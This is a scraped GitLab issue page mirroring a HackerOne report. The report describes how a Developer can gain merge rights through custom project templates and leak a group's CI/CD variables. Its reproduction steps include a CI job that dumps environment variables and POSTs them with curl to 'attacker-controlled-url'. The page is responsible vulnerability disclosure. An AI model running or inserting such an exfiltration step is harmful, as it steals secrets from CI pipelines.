</span>&#x000A;<span id="LC18" class="line" lang="plaintext">DB Adapter:     PostgreSQL  </span>&#x000A;<span id="LC19" class="line" lang="plaintext">DB Version:     13.11  </span>&#x000A;<span id="LC20" class="line" lang="plaintext">URL:            http://x.x.x.x  </span>&#x000A;<span id="LC21" class="line" lang="plaintext">HTTP Clone URL: http://x.x.x.x/some-group/some-project.git  </span>&#x000A;<span id="LC22" class="line" lang="plaintext">SSH Clone URL:  git@x.x.x.x:some-group/some-project.git  </span>&#x000A;<span id="LC23" class="line" lang="plaintext">Elasticsearch:  no  </span>&#x000A;<span id="LC24" class="line" lang="plaintext">Geo:            no  </span>&#x000A;<span id="LC25" class="line" lang="plaintext">Using LDAP:     no  </span>&#x000A;<span id="LC26" class="line" lang="plaintext">Using Omniauth: yes  </span>&#x000A;<span id="LC27" class="line" lang="plaintext">Omniauth Providers:</span>&#x000A;<span id="LC28" class="line" lang="plaintext"></span>&#x000A;<span id="LC29" class="line" lang="plaintext">GitLab Shell  </span>&#x000A;<span id="LC30" class="line" lang="plaintext">Version:        14.20.0  </span>&#x000A;<span id="LC31" class="line" lang="plaintext">Repository storages:  </span>&#x000A;<span id="LC32" class="line" lang="plaintext">- default:      unix:/var/opt/gitlab/gitaly/gitaly.socket  </span>&#x000A;<span id="LC33" class="line" lang="plaintext">GitLab Shell path:              /opt/gitlab/embedded/service/gitlab-shell  </span></code></pre>&#x000A;<copy-code></copy-code>&#x000A;</div>&#x000A;<h4 data-sourcepos="109:1-109:12" dir="auto">&#x000A;<a id="user-content-impact" class="anchor" href="#impact" aria-hidden="true"></a>Impact</h4>&#x000A;<p data-sourcepos="111:1-111:72" dir="auto">Developer of a group can leak group or any subgroup’s CI/CD variables.</p>&#x000A;<h2 data-sourcepos="113:1-113:14" dir="auto">&#x000A;<a id="user-content-attachments" class="anchor" href="#attachments" aria-hidden="true"></a>Attachments</h2>&#x000A;<p data-sourcepos="115:1-115:77" dir="auto"><strong data-sourcepos="115:1-115:12">Warning:</strong> Attachments received through HackerOne, please exercise caution!</p>&#x000A;<ul data-sourcepos="117:1-119:0" dir="auto">&#x000A;<li data-sourcepos="117:1-117:89"><a data-sourcepos="117:3-117:89" href="https://h1.sec.gitlab.net/a/3faaa80c-7b9a-46f5-8144-2f85bebeb985/high1.png" rel="nofollow noreferrer noopener" target="_blank">high1.png</a></li>&#x000A;<li data-sourcepos="118:1-119:0"><a data-sourcepos="118:3-118:89" href="https://h1.sec.gitlab.net/a/98a69390-49cc-4df1-9e90-c42586aa3cff/high2.png" rel="nofollow noreferrer noopener" target="_blank">high2.png</a></li>&#x000A;</ul>&#x000A;<h2 data-sourcepos="120:1-120:19" dir="auto">&#x000A;<a id="user-content-how-to-reproduce" class="anchor" href="#how-to-reproduce" aria-hidden="true"></a>How To Reproduce</h2>&#x000A;<p data-sourcepos="122:1-122:57" dir="auto">Please add <a data-sourcepos="122:12-122:40" href="https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues" rel="nofollow noreferrer noopener" target="_blank">reproducibility information</a> to this section:</p>&#x000A;<ol data-sourcepos="124:1-127:0" dir="auto">&#x000A;<li data-sourcepos="124:1-124:2">&#x000A;</li>&#x000A;<li data-sourcepos="125:1-125:2">&#x000A;</li>&#x000A;<li data-sourcepos="126:1-126:2">&#x000A;</li>&#x000A;</ol></div>
</div>
<div class="edited-text gl-mt-4 gl-text-subtle gl-text-sm">Edited <time class="js-timeago issue-edited-ago js-issue-edited-ago" title="Dec 15, 2023 7:03pm" datetime="2023-12-15T19:03:00Z" data-toggle="tooltip" data-placement="bottom" data-container="body">Dec 15, 2023</time> by <a class="author-link hover:gl-underline gl-text-subtle js-user-link" data-user-id="10425157" data-username="kmorrison1" data-name="Kevin Morrison" href="/kmorrison1"><span class="">Kevin Morrison</span></a></div>
</div>
<div class="js-issue-widgets">
<div class="emoji-block emoji-block-sticky">
<div class="row gl-m-0 gl-justify-between">
<div class="js-noteable-awards">
<div class="gl-flex gl-flex-wrap gl-justify-between gl-pt-3">
<div data-can-award-emoji="false" data-path="/api/v4/projects/278964/issues/416244/award_emoji" data-show-default-award-emojis="true" id="js-vue-awards-block"></div>

</div>

</div>
<div class="new-branch-col gl-font-size-0 gl-my-2">

</div>
</div>
</div>

</div>
</div>
<div class="js-issue-widgets">

<div class="js-design-management" data-issue-iid="416244" data-issue-path="/gitlab-org/gitlab/-/issues/416244" data-new-comment-template-paths="[{&quot;text&quot;:&quot;Your comment templates&quot;,&quot;href&quot;:&quot;/-/profile/comment_templates&quot;}]" data-project-path="gitlab-org/gitlab" data-register-path="/users/sign_up?redirect_to_referer=yes" data-sign-in-path="/users/sign_in?redirect_to_referer=yes"></div>

<div class="js-work-item-links-root" data-full-path="gitlab-org/gitlab" data-issuable-id="129835514" data-issuable-iid="416244" data-register-path="/users/sign_up?redirect_to_referer=yes" data-sign-in-path="/users/sign_in?redirect_to_referer=yes" data-wi-autocomplete-award-emojis-path="/-/autocomplete/award_emojis" data-wi-can-admin-label="false" data-wi-can-bulk-edit-epics="false" data-wi-can-create-projects="false" data-wi-default-branch="master" data-wi-epics-list-path="/groups/gitlab/-/epics" data-wi-full-path="gitlab-org/gitlab" data-wi-group-id="9970" data-wi-group-issues-path="/groups/gitlab/-/issues" data-wi-group-path="gitlab-org" data-wi-has-epics-feature="true" data-wi-has-issuable-health-status-feature="true" data-wi-has-issue-weights-feature="true" data-wi-has-iterations-feature="true" data-wi-has-linked-items-epics-feature="true" data-wi-has-okrs-feature="true" data-wi-has-quality-management-feature="true" data-wi-has-scoped-labels-feature="true" data-wi-has-subepics-feature="true" data-wi-is-signed-in="false" data-wi-issues-list-path="/gitlab-org/gitlab/-/issues" data-wi-labels-fetch-path="/groups/gitlab/-/labels.json?include_ancestor_groups=true&amp;only_group_labels=true" data-wi-labels-manage-path="/gitlab-org/gitlab/-/labels" data-wi-new-comment-template-paths="[{&quot;text&quot;:&quot;Your comment templates&quot;,&quot;href&quot;:&quot;/-/profile/comment_templates&quot;}]" data-wi-new-project-path="/projects/new?namespace_id=9970" data-wi-register-path="/users/sign_up?redirect_to_referer=yes" data-wi-report-abuse-path="/-/abuse_reports/add_category" data-wi-show-new-issue-link="false" data-wi-sign-in-path="/users/sign_in?redirect_to_referer=yes"></div>


<div class="js-related-issues-root" data-can-add-related-issues="false" data-endpoint="/gitlab-org/gitlab/-/issues/416244/links" data-full-path="gitlab-org/gitlab" data-has-issue-weights-feature="true" data-has-iterations-feature="true" data-help-path="/help/user/project/issues/related_issues.md" data-is-group="false" data-issuable-type="issue" data-show-categorized-issues="true" data-wi-autocomplete-award-emojis-path="/-/autocomplete/award_emojis" data-wi-can-admin-label="false" data-wi-can-bulk-edit-epics="false" data-wi-can-create-projects="false" data-wi-default-branch="master" data-wi-epics-list-path="/groups/gitlab/-/epics" data-wi-full-path="gitlab-org/gitlab" data-wi-group-id="9970" data-wi-group-issues-path="/groups/gitlab/-/issues" data-wi-group-path="gitlab-org" data-wi-has-epics-feature="true" data-wi-has-issuable-health-status-feature="true" data-wi-has-issue-weights-feature="true" data-wi-has-iterations-feature="true" data-wi-has-linked-items-epics-feature="true" data-wi-has-okrs-feature="true" data-wi-has-quality-management-feature="true" data-wi-has-scoped-labels-feature="true" data-wi-has-subepics-feature="true" data-wi-is-signed-in="false" data-wi-issues-list-path="/gitlab-org/gitlab/-/issues" data-wi-labels-fetch-path="/groups/gitlab/-/labels.json?include_ancestor_groups=true&amp;only_group_labels=true" data-wi-labels-manage-path="/gitlab-org/gitlab/-/labels" data-wi-new-comment-template-paths="[{&quot;text&quot;:&quot;Your comment templates&quot;,&quot;href&quot;:&quot;/-/profile/comment_templates&quot;}]" data-wi-new-project-path="/projects/new?namespace_id=9970" data-wi-register-path="/users/sign_up?redirect_to_referer=yes" data-wi-report-abuse-path="/-/abuse_reports/add_category" data-wi-show-new-issue-link="false" data-wi-sign-in-path="/users/sign_in?redirect_to_referer=yes"></div>

<div data-has-closing-merge-request="false" data-iid="416244" data-project-path="gitlab-org/gitlab" id="js-related-merge-requests"></div>
<div data-url="/gitlab-org/gitlab/-/issues/416244/related_branches" id="related-branches">
</div>
</div>
<div class="js-issue-widgets">
<section class="issuable-discussion js-vue-notes-event">
<div data-can-add-timeline-events="false" data-current-user-data="null" data-new-comment-template-paths="[{&quot;text&quot;:&quot;Your comment templates&quot;,&quot;href&quot;:&quot;/-/profile/comment_templates&quot;}]" data-noteable-data="{&quot;id&quot;:129835514,&quot;iid&quot;:416244,&quot;description&quot;:&quot;:warning: **Please read [the process](https://gitlab.com/gitlab-org/release/docs/-/blob/master/general/security/developer.md) on how to fix security issues before starting to work on the issue. Vulnerabilities must be fixed in a security mirror.**\n\n**[HackerOne report #2021616](https://hackerone.com/reports/2021616)** by `theluci` on 2023-06-12, assigned to @ottilia_westerlund:\n\n[Report](#report) | [Attachments](#attachments) | [How To Reproduce](#how-to-reproduce)\n\n## Report\n\nHello,   \nGitlab recently fixed several bugs that allowed a developer to import a project and leak group’s CI/CD variables. To protect against these types of attacks, Gitlab set the minimum role for importing projects to maintainer.  \nGitlab also made the Custom project templates functionality reusable by developers in enterprise edition.  \nHowever, I found a bug using which a Developer can leak group or any subgroup’s CI/CD variables using Custom project templates functionality.\n\n####  Background\n\nGitlab provides a **Premium/Ultimate** feature [custom project templates functionality.](https://docs.gitlab.com/ee/user/group/custom_project_templates.html)  \nThe owner of the top-level group can set a subgroup to be used as a source of custom templates for new projects in the group and in any of the subgroups.\n\n####  Vulnerability\n\nWhen issue https://gitlab.com/gitlab-org/gitlab/-/issues/407374 was fixed gitlab changed importing logic as follows,  \nWhen a member imports a project where specific members are **Allowed to merge/Allowed to push and merge** -\n\n![high1.png](https://h1.sec.gitlab.net/a/3faaa80c-7b9a-46f5-8144-2f85bebeb985/high1.png)\n\nThen Gitlab replaces `user_id` of the member allowed to merge with the `user_id` of the member importing the project.  \n**That is, the member importing the project gets Allowed to merge/Allowed to push and merge access on the protected branch.**\n\n\u003c------------------------------------------Important----------------------------------------------\u003e  \nIt was probably thought that only maintainers/owners can import a project, thus, them getting allowed to merge access will not be a bug.  \nHowever, Custom project template functionality internally imports the template project.  \nThus, **if any maintainer, owner, or any other member has allowed to merge permission on protected branch of any of the templates.** Then, developer can just import the template (using custom project template functionality) and get allowed to merge setting on the protected branch.  \n\u003c------------------------------------------------------------------------------------------------------\u003e\n\n####  Steps to reproduce  \n(Your instance must have an ultimate trial)\n\n1. `victim` creates a group `victim-group`.  \n2. `victim` creates a subgroup `subgroup-to-be-template` and template projects `template1`,`template2` inside.  \n3. `victim` goes to `http://\u003cYour_Instance_IP\u003e/groups/\u003cvictim-group\u003e/-/edit`, **Expand Custom project templates** and select `subgroup-to-be-template`  \n4. `victim` goes to template1 repository settings `http://\u003cYour_Instance_IP\u003e/\u003cvictim-group\u003e/\u003csubgroup-to-be-template\u003e/template1/-/settings/repository`, **Expand Protected branches** and gives himself *Allowed to merge* OR *Allowed to push and merge* access on protected branch.\n\n![high2.png](https://h1.sec.gitlab.net/a/98a69390-49cc-4df1-9e90-c42586aa3cff/high2.png)\n\nIn a real-world scenario, it may not be the owner but any member (maybe a maintainer or some other member) that has **Allowed to merge/Allowed to push and merge** access on protected branch of any of the templates.  \nIt might also be possible that no roles are **Allowed to merge/Allowed to push and merge** but specific users (any user).\n\nAs `victim`,  \n5. `victim` goes to `http://\u003cYour_Instance_IP\u003e/groups/\u003cvictim-group\u003e/-/settings/ci_cd`, **Expand Variables ** and adds some CI/CD variables.  \n6. `victim` goes to `http://\u003cYour_Instance_IP\u003e/groups/\u003cvictim-group\u003e/-/group_members` and adds `attacker` as *Developer*.\n\nAs `attacker`,  \n7. `attacker` goes to `victim-group`, clicks on **new project** and chooses Create from template.  \n8. `attacker` uses `template1` and creates `attacker-project`  \n`attacker` now have **Allowed to merge/Allowed to push and merge** access on protected branch of `attacker-project`.  \n9. `attacker` adds the following **.gitlab-ci.yml file**\n\n```  \njob_name:      \n script:      \n   - export \u003e test.txt      \n   - curl -X POST --data \&quot;$(cat test.txt)\&quot; attacker-controlled-url  \n```\n\nThe group&#39;s CI/CD variables are sent to ***attacker-controlled-url***.\n\n####  Output of checks\n\nThis bug happens on Self-hosted Gitlab Instance.\n\n####  Results of GitLab environment info\n\n```  \nSystem information  \nSystem:         Ubuntu 20.04  \nProxy:          no  \nCurrent User:   git  \nUsing RVM:      no  \nRuby Version:   3.0.6p216  \nGem Version:    3.4.13  \nBundler Version:2.4.13  \nRake Version:   13.0.6  \nRedis Version:  6.2.11  \nSidekiq Version:6.5.7  \nGo Version:     unknown\n\nGitLab information  \nVersion:        16.0.4-ee  \nRevision:       7d6834bd32e  \nDirectory:      /opt/gitlab/embedded/service/gitlab-rails  \nDB Adapter:     PostgreSQL  \nDB Version:     13.11  \nURL:            http://x.x.x.x  \nHTTP Clone URL: http://x.x.x.x/some-group/some-project.git  \nSSH Clone URL:  git@x.x.x.x:some-group/some-project.git  \nElasticsearch:  no  \nGeo:            no  \nUsing LDAP:     no  \nUsing Omniauth: yes  \nOmniauth Providers:\n\nGitLab Shell  \nVersion:        14.20.0  \nRepository storages:  \n- default:      unix:/var/opt/gitlab/gitaly/gitaly.socket  \nGitLab Shell path:              /opt/gitlab/embedded/service/gitlab-shell  \n```\n\n####  Impact\n\nDeveloper of a group can leak group or any subgroup’s CI/CD variables.\n\n## Attachments\n\n**Warning:** Attachments received through HackerOne, please exercise caution!\n\n* [high1.png](https://h1.sec.gitlab.net/a/3faaa80c-7b9a-46f5-8144-2f85bebeb985/high1.png)\n* [high2.png](https://h1.sec.gitlab.net/a/98a69390-49cc-4df1-9e90-c42586aa3cff/high2.png)\n\n## How To Reproduce\n\nPlease add [reproducibility information] to this section:\n\n1.\n1.\n1.\n\n[reproducibility information]: https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues&quot;,&quot;title&quot;:&quot;Developer can leak group and any subgroup’s CI/CD variables using Custom project templates functionality&quot;,&quot;time_estimate&quot;:0,&quot;total_time_spent&quot;:0,&quot;human_time_estimate&quot;:null,&quot;human_total_time_spent&quot;:null,&quot;state&quot;:&quot;closed&quot;,&quot;milestone_id&quot;:3094093,&quot;updated_by_id&quot;:10425157,&quot;created_at&quot;:&quot;2023-06-26T09:09:56Z&quot;,&quot;updated_at&quot;:&quot;2024-07-10T06:12:01Z&quot;,&quot;milestone&quot;:{&quot;id&quot;:3094093,&quot;iid&quot;:92,&quot;group_id&quot;:9970,&quot;title&quot;:&quot;16.5&quot;,&quot;description&quot;:&quot;&quot;,&quot;state&quot;:&quot;active&quot;,&quot;created_at&quot;:&quot;2023-05-09T04:49:42.387Z&quot;,&quot;updated_at&quot;:&quot;2023-05-09T04:49:42.387Z&quot;,&quot;due_date&quot;:&quot;2023-10-17&quot;,&quot;start_date&quot;:&quot;2023-09-18&quot;,&quot;expired&quot;:true,&quot;web_url&quot;:&quot;https://gitlab.com/groups/gitlab-org/-/milestones/92&quot;},&quot;labels&quot;:[{&quot;id&quot;:11469047,&quot;title&quot;:&quot;Category:Source Code Management&quot;,&quot;color&quot;:&quot;#428BCA&quot;,&quot;description&quot;:&quot;Category vision in Create stage: https://gitlab.com/groups/gitlab-org/-/epics/687&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2019-07-25T19:15:39.531Z&quot;,&quot;updated_at&quot;:&quot;2019-08-27T17:08:57.741Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:992791,&quot;title&quot;:&quot;Deliverable&quot;,&quot;color&quot;:&quot;#428BCA&quot;,&quot;description&quot;:&quot;Issues scheduled for the current milestone.&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2016-11-18T17:02:50.145Z&quot;,&quot;updated_at&quot;:&quot;2019-04-17T18:49:16.998Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:3417347,&quot;title&quot;:&quot;HackerOne&quot;,&quot;color&quot;:&quot;#0033CC&quot;,&quot;description&quot;:&quot;&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2018-01-31T13:53:42.609Z&quot;,&quot;updated_at&quot;:&quot;2019-01-09T12:13:21.325Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:16845059,&quot;title&quot;:&quot;Weakness::CWE-284&quot;,&quot;color&quot;:&quot;#7F8C8D&quot;,&quot;description&quot;:&quot;Improper Access Control - Generic&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2020-10-27T18:02:21.437Z&quot;,&quot;updated_at&quot;:&quot;2020-10-27T18:02:21.437Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:2492649,&quot;title&quot;:&quot;backend&quot;,&quot;color&quot;:&quot;#D10069&quot;,&quot;description&quot;:&quot;Issues that require backend work&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2017-08-15T14:49:42.004Z&quot;,&quot;updated_at&quot;:&quot;2018-06-11T10:34:33.030Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:4107753,&quot;title&quot;:&quot;bug::vulnerability&quot;,&quot;color&quot;:&quot;#CC0000&quot;,&quot;description&quot;:&quot;A security vulnerability&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2018-05-22T15:15:09.960Z&quot;,&quot;updated_at&quot;:&quot;2022-03-16T11:32:16.336Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:3103452,&quot;title&quot;:&quot;devops::create&quot;,&quot;color&quot;:&quot;#E44D2A&quot;,&quot;description&quot;:&quot;Issues for the Create stage of the DevOps lifecycle (e.g. Source Code Management, Design Management, Web IDE, Code Review, Gitter)&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2017-12-01T19:01:03.585Z&quot;,&quot;updated_at&quot;:&quot;2022-07-04T07:09:55.759Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:10309854,&quot;title&quot;:&quot;group::source code&quot;,&quot;color&quot;:&quot;#A8D695&quot;,&quot;description&quot;:&quot;Issues belonging to the Source Code group of the Create stage of the DevOps lifecycle. See https://about.gitlab.com/handbook/product/categories/#source-code-group&quot;,&quot;text_color&quot;:&quot;#1F1E24&quot;,&quot;created_at&quot;:&quot;2019-04-17T13:57:02.280Z&quot;,&quot;updated_at&quot;:&quot;2019-05-23T09:26:35.519Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:3857543,&quot;title&quot;:&quot;priority::4&quot;,&quot;color&quot;:&quot;#008000&quot;,&quot;description&quot;:&quot;We don&#39;t have visibility when this will be addressed. See https://handbook.gitlab.com/handbook/engineering/infrastructure/engineering-productivity/issue-triage/#priority&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2018-04-13T08:05:19.216Z&quot;,&quot;updated_at&quot;:&quot;2024-04-01T13:24:05.529Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:31607339,&quot;title&quot;:&quot;project-templates&quot;,&quot;color&quot;:&quot;#ed9121&quot;,&quot;description&quot;:&quot;Instance-level, Group-level or Built-in Project Templates&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2023-09-07T19:21:15.093Z&quot;,&quot;updated_at&quot;:&quot;2023-09-07T19:21:15.093Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:14918378,&quot;title&quot;:&quot;section::dev&quot;,&quot;color&quot;:&quot;#F0AD4E&quot;,&quot;description&quot;:&quot;Issues related to the Dev section&quot;,&quot;text_color&quot;:&quot;#1F1E24&quot;,&quot;created_at&quot;:&quot;2020-05-11T22:11:57.167Z&quot;,&quot;updated_at&quot;:&quot;2020-05-11T22:11:57.167Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:2779335,&quot;title&quot;:&quot;security&quot;,&quot;color&quot;:&quot;#d9534f&quot;,&quot;description&quot;:&quot;Issues related to the security of GitLab or its dependencies. Please report vulnerabilities responsibly per https://about.gitlab.com/security/disclosure/&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2017-10-05T14:36:39.341Z&quot;,&quot;updated_at&quot;:&quot;2023-05-24T20:20:05.269Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:3713900,&quot;title&quot;:&quot;severity::4&quot;,&quot;color&quot;:&quot;#008000&quot;,&quot;description&quot;:&quot;Low - applies to bugs and bug categories of availability, performance, security and ux. See https://handbook.gitlab.com/handbook/engineering/infrastructure/engineering-productivity/issue-triage/#severity&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2018-03-23T14:46:07.848Z&quot;,&quot;updated_at&quot;:&quot;2024-04-01T13:12:39.737Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:18798869,&quot;title&quot;:&quot;tw::triaged&quot;,&quot;color&quot;:&quot;#228B22&quot;,&quot;description&quot;:&quot;The Technical Writing effort for this has been identified, and no additional reminders are required from the bot.&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2021-02-23T17:20:45.112Z&quot;,&quot;updated_at&quot;:&quot;2021-02-23T17:20:45.112Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:2278648,&quot;title&quot;:&quot;type::bug&quot;,&quot;color&quot;:&quot;#cc0000&quot;,&quot;description&quot;:&quot;Issues that report undesirable or incorrect behavior. See https://handbook.gitlab.com/handbook/product/groups/product-analysis/engineering/metrics/#work-type-classification&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2017-07-07T20:20:34.868Z&quot;,&quot;updated_at&quot;:&quot;2024-11-08T09:52:16.699Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:28669354,&quot;title&quot;:&quot;workflow::complete&quot;,&quot;color&quot;:&quot;#428BCA&quot;,&quot;description&quot;:&quot;Applied after all MRs have merged and the issue has been verified if necessary&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2023-01-12T00:18:59.592Z&quot;,&quot;updated_at&quot;:&quot;2023-01-12T17:27:43.939Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false}],&quot;lock_version&quot;:1,&quot;author_id&quot;:2741139,&quot;confidential&quot;:false,&quot;discussion_locked&quot;:null,&quot;assignees&quot;:[{&quot;id&quot;:11390638,&quot;username&quot;:&quot;jwoodwardgl&quot;,&quot;name&quot;:&quot;Joe Woodward&quot;,&quot;state&quot;:&quot;active&quot;,&quot;locked&quot;:false,&quot;avatar_url&quot;:&quot;https://gitlab.com/uploads/-/system/user/avatar/11390638/avatar.png&quot;,&quot;web_url&quot;:&quot;https://gitlab.com/jwoodwardgl&quot;}],&quot;due_date&quot;:&quot;2023-11-30&quot;,&quot;project_id&quot;:278964,&quot;moved_to_id&quot;:null,&quot;duplicated_to_id&quot;:null,&quot;web_url&quot;:&quot;/gitlab-org/gitlab/-/issues/416244&quot;,&quot;current_user&quot;:{&quot;can_create_note&quot;:false,&quot;can_create_confidential_note&quot;:false,&quot;can_update&quot;:false,&quot;can_set_issue_metadata&quot;:false,&quot;can_award_emoji&quot;:false},&quot;create_note_path&quot;:&quot;/gitlab-org/gitlab/notes?target_id=129835514\u0026target_type=issue&quot;,&quot;preview_note_path&quot;:&quot;/gitlab-org/gitlab/-/preview_markdown?target_id=416244\u0026target_type=Issue&quot;,&quot;is_project_archived&quot;:false,&quot;issue_email_participants&quot;:[],&quot;type&quot;:&quot;ISSUE&quot;,&quot;weight&quot;:3,&quot;blocked&quot;:false,&quot;blocked_by_issues&quot;:[]}" data-noteable-type="Issue" data-notes-data="{&quot;noteableType&quot;:&quot;issue&quot;,&quot;noteableId&quot;:129835514,&quot;projectId&quot;:278964,&quot;groupId&quot;:null,&quot;discussionsPath&quot;:&quot;/gitlab-org/gitlab/-/issues/416244/discussions.json&quot;,&quot;registerPath&quot;:&quot;/users/sign_up?redirect_to_referer=yes&quot;,&quot;newSessionPath&quot;:&quot;/users/sign_in?redirect_to_referer=yes&quot;,&quot;markdownDocsPath&quot;:&quot;/help/user/markdown.md&quot;,&quot;quickActionsDocsPath&quot;:&quot;/help/user/project/quick_actions.md&quot;,&quot;closePath&quot;:&quot;/gitlab-org/gitlab/-/issues/416244.json?issue%5Bstate_event%5D=close&quot;,&quot;reopenPath&quot;:&quot;/gitlab-org/gitlab/-/issues/416244.json?issue%5Bstate_event%5D=reopen&quot;,&quot;notesPath&quot;:&quot;/gitlab-org/gitlab/noteable/issue/129835514/notes&quot;,&quot;prerenderedNotesCount&quot;:10,&quot;lastFetchedAt&quot;:1736517079000000,&quot;notesFilter&quot;:null}" data-notes-filters="{&quot;Show all activity&quot;:0,&quot;Show comments only&quot;:1,&quot;Show history only&quot;:2}" data-report-abuse-path="/-/abuse_reports/add_category" data-show-timeline-view-toggle="false" data-target-type="issue" id="js-vue-notes"></div>
</section>

</div>
</div>
<aside aria-label="issue" aria-live="polite" class="right-sidebar js-right-sidebar js-issuable-sidebar right-sidebar-expanded" data-always-show-toggle data-auto-collapse data-issuable-type="issue">
<div class="issuable-sidebar">
<div class="issuable-sidebar-header">
<button class="gl-button btn btn-md btn-default gutter-toggle gl-float-right js-sidebar-toggle has-tooltip !gl-border-0" type="button" aria-label="Toggle sidebar" title="Collapse sidebar" data-container="body" data-placement="left" data-boundary="viewport" type="button"><span class="gl-button-text">
<span class="js-sidebar-toggle-container gl-button-text" data-is-expanded="true"><svg class="s16 js-sidebar-expand hidden" data-testid="chevron-double-lg-left-icon"><use href="/assets/icons-8791a66659d025e0a4c801978c79a1fbd82db1d27d85f044a35728ea7cf0ae80.svg#chevron-double-lg-left"></use></svg><svg class="s16 js-sidebar-collapse " data-testid="chevron-double-lg-right-icon"><use href="/assets/icons-8791a66659d025e0a4c801978c79a1fbd82db1d27d85f044a35728ea7cf0ae80.svg#chevron-double-lg-right"></use></svg></span>

</span>

</button></div>
<form class="issuable-context-form inline-update js-issuable-update " action="/gitlab-org/gitlab/-/issues/416244.json" accept-charset="UTF-8" data-remote="true" method="post"><div class="block assignee gl-mt-3" data-testid="assignee-block-container">
<div class="js-sidebar-assignees-root" data-field="issue" data-max-assignees="200">
<div class="title hide-collapsed gl-flex gl-justify-between gl-items-center !gl-mb-0">
<span class="gl-font-bold">Assignee</span>
<span class="gl-spinner-container" role="status"><span aria-hidden class="gl-spinner gl-spinner-sm gl-spinner-dark !gl-align-text-bottom"></span><span class="gl-sr-only !gl-absolute">Loading</span>
</span>
</div>
</div>

</div>
<div class="block epic" data-testid="sidebar-epic">
<div class="js-sidebar-epic-widget-root" data-can-edit="false" data-group-path="gitlab-org" data-issue-id="129835514" data-issue-iid="416244" data-project-path="gitlab-org/gitlab"></div>
</div>

<div class="js-sidebar-labels-widget-root" data-allow-label-create="" data-allow-scoped-labels="true" data-can-edit="" data-iid="416244" data-issuable-type="issue" data-labels-fetch-path="/gitlab-org/gitlab/-/labels.json?include_ancestor_groups=true" data-labels-manage-path="/gitlab-org/gitlab/-/labels" data-project-issues-path="/gitlab-org/gitlab/-/issues" data-project-path="gitlab-org/gitlab" data-selected-labels="[{&quot;id&quot;:11469047,&quot;title&quot;:&quot;Category:Source Code Management&quot;,&quot;color&quot;:&quot;#428BCA&quot;,&quot;description&quot;:&quot;Category vision in Create stage: https://gitlab.com/groups/gitlab-org/-/epics/687&quot;,&quot;text_color&quot;:&quot;#FFFFFF&quot;,&quot;created_at&quot;:&quot;2019-07-25T19:15:39.531Z&quot;,&quot;updated_at&quot;:&quot;2019-08-27T17:08:57.741Z&quot;,&quot;group_id&quot;:9970,&quot;project_id&quot;:null,&quot;template&quot;:false},{&quot;id&quot;:992791,&quot;title&quot;:&quot;Deliverable&quot;,&quot;color&quot;:&quot;#428BCA&quot;,&quot;description&quot;:&quot;Issues scheduled for the current 